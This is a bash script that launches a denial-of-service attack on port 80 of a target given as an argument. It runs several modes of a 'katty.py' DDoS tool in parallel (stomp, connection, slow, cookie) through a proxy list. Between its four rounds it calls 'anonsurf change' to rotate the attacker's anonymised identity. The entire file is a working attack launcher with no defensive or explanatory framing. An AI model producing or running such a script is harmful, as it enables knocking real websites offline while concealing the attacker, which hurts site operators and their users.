#!/bin/bash
DATE=`date +%F-%H_%M-`
PORT="80"
KATTY="/root/kattymad/ddos"
PROXY="/root/kattymad/ddos/files/proxies/proxy.txt"
anonsurf change
python3 $KATTY/katty.py stomp $1 0 256 proxy.txt $PORT $2 debug &
python3 $KATTY/katty.py connection $1 500 $2 debug &
python3 $KATTY/katty.py slow $1 0 256 proxy.txt $PORT $2 debug &
python3 $KATTY/katty.py cookie $1 0 256 proxy.txt $PORT $2 debug 
anonsurf change
python3 $KATTY/katty.py stomp $1 0 256 proxy.txt $PORT $2 debug &
python3 $KATTY/katty.py connection $1 500 $2 &
python3 $KATTY/katty.py slow $1 0 256 proxy.txt $PORT $2 debug &
python3 $KATTY/katty.py cookie $1 0 256 proxy.txt $PORT $2 debug 
anonsurf change
python3 $KATTY/katty.py stomp $1 0 256 proxy.txt $PORT $2 debug &
python3 $KATTY/katty.py connection $1 500 $2  &
python3 $KATTY/katty.py slow $1 0 256 proxy.txt $PORT $2 debug  &
python3 $KATTY/katty.py cookie $1 0 256 proxy.txt $PORT $2 debug
anonsurf change
python3 $KATTY/katty.py stomp $1 0 256 proxy.txt $PORT $2 debug &
python3 $KATTY/katty.py connection $1 300 $2 &
python3 $KATTY/katty.py slow $1 0 256 proxy.txt $PORT $2 debug &
python3 $KATTY/katty.py cookie $1 0 256 proxy.txt $PORT $2 debug &